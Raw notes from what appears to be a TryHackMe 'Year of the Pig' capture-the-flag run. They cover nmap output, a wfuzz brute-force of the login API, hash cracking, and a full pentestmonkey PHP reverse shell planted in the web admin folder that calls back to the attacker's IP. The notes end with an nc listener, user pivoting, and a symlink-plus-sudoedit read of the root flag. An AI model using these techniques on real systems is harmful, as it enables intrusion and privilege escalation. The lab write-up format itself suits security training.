@@ -1,0 +1,391 @@
+IP:10.10.224.215
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearofthePig# nmap -A -T4 10.10.224.215
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-15 13:35 IST
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+WARNING: RST from 10.10.224.215 port 22 -- is this port really open?
+Nmap scan report for 10.10.224.215
+Host is up (0.15s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Marco's Blog
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=11/15%OT=22%CT=1%CU=36143%PV=Y%DS=2%DC=T%G=Y%TM=5FB0E1
+OS:5B%P=x86_64-pc-linux-gnu)SEQ(CI=Z%II=I)SEQ(CI=Z)OPS(O1=M505ST11NW6%O2=%O
+OS:3=%O4=%O5=%O6=)WIN(W1=F4B3%W2=0%W3=0%W4=0%W5=0%W6=0)ECN(R=Y%DF=Y%T=40%W=
+OS:0%O=%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y
+OS:%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR
+OS:%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40
+OS:%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G
+OS:%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
+
+Network Distance: 2 hops
+
+const _0x44d4=['auth','querySelector','click','replace','post','#submit-btn','input','then','authLogin=','addEventListener','keyCode','#username','style','Success','/admin','keyup','location','Response','cookie','application/json','stringify','same-origin','querySelectorAll','value','opacity:\x201'];(function(_0x2a05df,_0x44d43e){const _0x48fdee=function(_0x21eb22){while(--_0x21eb22){_0x2a05df['push'](_0x2a05df['shift']());}};_0x48fdee(++_0x44d43e);}(_0x44d4,0x114));const _0x48fd=function(_0x2a05df,_0x44d43e){_0x2a05df=_0x2a05df-0x0;let _0x48fdee=_0x44d4[_0x2a05df];return _0x48fdee;};function login(){const _0x289586=document[_0x48fd('0x0')]('#username'),_0x56c661=document[_0x48fd('0x0')]('#password'),_0x236a57=md5(_0x56c661[_0x48fd('0x16')]);fetch('/api/login',{'method':_0x48fd('0x3'),'credentials':_0x48fd('0x14'),'headers':{'Accept':_0x48fd('0x12')},'body':JSON[_0x48fd('0x13')]({'username':_0x289586[_0x48fd('0x16')],'password':_0x236a57})})[_0x48fd('0x6')](_0x59ed95=>_0x59ed95['json']())['then'](_0x5d33bc=>{document[_0x48fd('0x0')](_0x48fd('0xa'))['value']='',document[_0x48fd('0x0')]('#password')[_0x48fd('0x16')]='',_0x5d33bc[_0x48fd('0x10')]==_0x48fd('0xc')?(document[_0x48fd('0x11')]=_0x48fd('0x7')+_0x5d33bc[_0x48fd('0x18')]+';\x20samesite=lax;\x20path=\x22/\x22',window[_0x48fd('0xf')][_0x48fd('0x2')](_0x48fd('0xd'))):(alert(_0x5d33bc['Verbose']),document[_0x48fd('0x0')]('#pass-hint')[_0x48fd('0xb')]=_0x48fd('0x17'));});}document[_0x48fd('0x15')](_0x48fd('0x5'))['forEach'](_0x47694c=>{_0x47694c[_0x48fd('0x8')](_0x48fd('0xe'),_0x571e21=>{_0x571e21[_0x48fd('0x9')]===0xd&&document[_0x48fd('0x0')](_0x48fd('0x4'))[_0x48fd('0x1')]();});});
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearofthePig# cat password.txt
+Macchi
+macchi
+savoia
+Savoia
+curtiss
+Curtiss
+planes
+Planes
+
+
+Looks like we can create a custom wordlist for brute-forcing it against Login page.
+
+Special characters : $#?*!%=
+
+The password should be a word followed by number followed by special character.
+
+Thats a info disclosure
+
+
+We can create a script to make this work.
+
+Or we can make the use of hydra to automate the process.
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearofthePig#  wfuzz -w new_wordlist -H "User-Agent: Bypass" -X POST -d '{"username":"marco","password":"FUZZ"}' -u http://10.10.161.173/api/login --hh 63
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/bing.py Exception, msg=No module named 'shodan'
+libraries.FileLoader: CRITICAL __load_py_from_file. Filename: /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/shodanp.py Exception, msg=No module named 'shodan'
+********************************************************
+* Wfuzz 2.4.5 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.161.173/api/login
+Total requests: 1400
+
+===================================================================
+ID           Response   Lines    Word     Chars       Payload                                                           
+===================================================================
+
+000000424:   500        0 L      0 W      0 Ch        "348e8c37539c5abee0f163d6603163d5"                                
+000000425:   500        0 L      0 W      0 Ch        "72197a82d27cc146a49178f2db2f4430"                                
+000000422:   200        0 L      3 W      99 Ch       "ea22b622ba9b3c41b22785dcb40211ac"
+
+Here the one with 99Ch looks suspicious so we can try to login using that.
+
+OK we can access the website and thus we run some commands.
+
+http://10.10.161.173/admin/
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+But this was just a loophole as I was not able to get any kinda shell from it.
+
+Now what we can do is use the same credentials to log in via ssh
+
+
+root@LAPTOP-U5913CMD:/home/akshay/Desktop/YearofthePig# ssh marco@10.10.161.173
+The authenticity of host '10.10.161.173 (10.10.161.173)' can't be established.
+ECDSA key fingerprint is SHA256:2KjF+8WJY6OrFINzn62WeweHnY6FXTMQ9Xfa6RTvPhA.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.161.173' (ECDSA) to the list of known hosts.
+marco@10.10.161.173's password:
+
+
+        __   __                       __   _   _            ____  _
+        \ \ / /__  __ _ _ __    ___  / _| | |_| |__   ___  |  _ \(_) __ _
+         \ V / _ \/ _` | '__|  / _ \| |_  | __| '_ \ / _ \ | |_) | |/ _` |
+          | |  __/ (_| | |    | (_) |  _| | |_| | | |  __/ |  __/| | (_| |
+          |_|\___|\__,_|_|     \___/|_|    \__|_| |_|\___| |_|   |_|\__, |
+                                                                    |___/
+
+
+marco@year-of-the-pig:~$ id
+uid=1000(marco) gid=1000(marco) groups=1000(marco),1002(web-developers)
+marco@year-of-the-pig:~$
+
+Yeah nice...
+
+
+256curtisa80bfe309ecaafcea1ea6cb3677971f2IMM58a2f366b1fd51e127a47da03afc9995marcoea22b622ba9b3c41b22785dcb40211ac
+
+curtis - a80bfe309ecaafcea1ea6cb3677971f2
+marco - ea22b622ba9b3c41b22785dcb40211ac
+
+curtis - Donal#########
+
+marco@year-of-the-pig:/var/www/html/admin$ nano resetpassword.php
+marco@year-of-the-pig:/var/www/html/admin$ cat resetpassword.php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  The author accepts no liability
+// for damage caused by this tool.  If these terms are not acceptable to you, then
+// do not use this tool.
+//
+// In all other respects the GPL version 2 applies:
+//
+// This program is free software; you can redistribute it and/or modify
+// it under the terms of the GNU General Public License version 2 as
+// published by the Free Software Foundation.
+//
+// This program is distributed in the hope that it will be useful,
+// but WITHOUT ANY WARRANTY; without even the implied warranty of
+// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+// GNU General Public License for more details.
+//
+// You should have received a copy of the GNU General Public License along
+// with this program; if not, write to the Free Software Foundation, Inc.,
+// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
+//
+// This tool may be used for legal purposes only.  Users take full responsibility
+// for any actions performed using this tool.  If these terms are not acceptable to
+// you, then do not use this tool.
+//
+// You are encouraged to send comments, improvements or suggestions to
+// me at pentestmonkey@pentestmonkey.net
+//
+// Description
+// -----------
+// This script will make an outbound TCP connection to a hardcoded IP and port.
+// The recipient will be given a shell running as the current user (apache normally).
+//
+// Limitations
+// -----------
+// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
+// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
+// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
+//
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.9.81.62';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+
+// pcntl_fork is hardly ever available, but will allow us to daemonise
+// our php process and avoid zombies.  Worth a try...
+if (function_exists('pcntl_fork')) {
+        // Fork and have the parent process exit
+        $pid = pcntl_fork();
+
+        if ($pid == -1) {
+                printit("ERROR: Can't fork");
+                exit(1);
+        }
+
+        if ($pid) {
+                exit(0);  // Parent exits
+        }
+
+        // Make the current process a session leader
+        // Will only succeed if we forked
+        if (posix_setsid() == -1) {
+                printit("Error: Can't setsid()");
+                exit(1);
+        }
+
+        $daemon = 1;
+} else {
+        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+// Change to a safe directory
+chdir("/");
+
+// Remove any umask we inherited
+umask(0);
+
+//
+// Do the reverse shell...
+//
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+        printit("$errstr ($errno)");
+        exit(1);
+}
+
+// Spawn shell process
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+        printit("ERROR: Can't spawn shell");
+        exit(1);
+}
+
+// Set everything to non-blocking
+// Reason: Occsionally reads will block, even though stream_select tells us they won't
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+        // Check for end of TCP connection
+        if (feof($sock)) {
+                printit("ERROR: Shell connection terminated");
+                break;
+        }
+
+        // Check for end of STDOUT
+        if (feof($pipes[1])) {
+                printit("ERROR: Shell process terminated");
+                break;
+        }
+
+        // Wait until a command is end down $sock, or some
+        // command output is available on STDOUT or STDERR
+        $read_a = array($sock, $pipes[1], $pipes[2]);
+        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+        // If we can read from the TCP socket, send
+        // data to process's STDIN
+        if (in_array($sock, $read_a)) {
+                if ($debug) printit("SOCK READ");
+                $input = fread($sock, $chunk_size);
+                if ($debug) printit("SOCK: $input");
+                fwrite($pipes[0], $input);
+        }
+
+        // If we can read from the process's STDOUT
+        // send data down tcp connection
+        if (in_array($pipes[1], $read_a)) {
+                if ($debug) printit("STDOUT READ");
+                $input = fread($pipes[1], $chunk_size);
+                if ($debug) printit("STDOUT: $input");
+                fwrite($sock, $input);
+        }
+
+        // If we can read from the process's STDERR
+        // send data down tcp connection
+        if (in_array($pipes[2], $read_a)) {
+                if ($debug) printit("STDERR READ");
+                $input = fread($pipes[2], $chunk_size);
+                if ($debug) printit("STDERR: $input");
+                fwrite($sock, $input);
+        }
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+// Like print, but does nothing if we've daemonised ourself
+// (I can't figure out how to redirect STDOUT like a proper daemon)
+function printit ($string) {
+        if (!$daemon) {
+                print "$string\n";
+        }
+}
+
+?>
+
+root@LAPTOP-U5913CMD:/home/akshay/Downloads# nc -nvlp 1234
+Listening on 0.0.0.0 1234
+Connection received on 10.10.42.39 56848
+Linux year-of-the-pig 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+ 19:11:43 up 13 min,  1 user,  load average: 0.00, 0.16, 0.26
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+marco    pts/0    10.9.81.62       19:02    3:19   0.63s  0.63s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(web-developers)
+/bin/sh: 0: can't access tty; job control turned off
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+
+
+Now we can check the contents of admin.db and try to crack the curtis's password.
+
+
+GO to https://crackstation.net/ and crack the hash for the password.
+
+a80bfe309ecaafcea1ea6cb3677971f2        md5     Donald1983$
+
+marco@year-of-the-pig:/var/www/html/admin$ su curtis
+Password:
+curtis@year-of-the-pig:/var/www/html/admin$ id
+uid=1001(curtis) gid=1001(curtis) groups=1001(curtis)
+curtis@year-of-the-pig:/var/www/html/admin$ cd /home
+curtis@year-of-the-pig:/home$ ls -la
+total 16
+drwxr-xr-x  4 root   root   4096 Aug 16 14:12 .
+drwxr-xr-x 22 root   root   4096 Aug 16 14:07 ..
+drwxr-xr-x  3 curtis curtis 4096 Nov 15 19:23 curtis
+drwxr-xr-x  3 marco  marco  4096 Nov 15 19:03 marco
+curtis@year-of-the-pig:/home$ cd curtis
+curtis@year-of-the-pig:~$ ls -la
+total 28
+drwxr-xr-x 3 curtis curtis 4096 Nov 15 19:23 .
+drwxr-xr-x 4 root   root   4096 Aug 16 14:12 ..
+lrwxrwxrwx 1 root   root      9 Aug 16 14:12 .bash_history -> /dev/null
+-rw-r--r-- 1 curtis curtis  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 curtis curtis 3771 Apr  4  2018 .bashrc
+-r-------- 1 curtis curtis   38 Aug 22 00:51 flag2.txt
+drwx------ 3 curtis curtis 4096 Nov 15 19:23 .gnupg
+-rw-r--r-- 1 curtis curtis  807 Apr  4  2018 .profile
+curtis@year-of-the-pig:~$ cat flag2.txt
+THM{Y2Q2N2M1NzNmYT###################}
+
+www-data@year-of-the-pig:/var/www/html/assets/img$ ln -s /root/root.txt config.php
+<ww/html/assets/img$ ln -s /root/root.txt config.php
+www-data@year-of-the-pig:/var/www/html/assets/img$ ls -la
+ls -la
+total 188
+drwxrwxr-x 2 www-data web-developers   4096 Nov 15 19:38 .
+drwxrwxr-x 4 www-data web-developers   4096 Aug 20 18:48 ..
+-rw-r--r-- 1 root     root              156 May 15  2020 arrow.png
+lrwxrwxrwx 1 www-data www-data           14 Nov 15 19:38 config.php -> /root/root.txt
+-rwxrwxr-x 1 www-data web-developers 106905 Aug 17 13:10 favicon.ico
+-rwxrwxr-x 1 www-data web-developers  66886 Aug 16 22:56 plane.png
+www-data@year-of-the-pig:/var/www/html/assets/img$
+
+curtis@year-of-the-pig:/var/www/html/assets/img$ /usr/bin/sudoedit /var/www/html/assets/img/config.php
+
+THM{MjcxNmVmYjNhY###################}
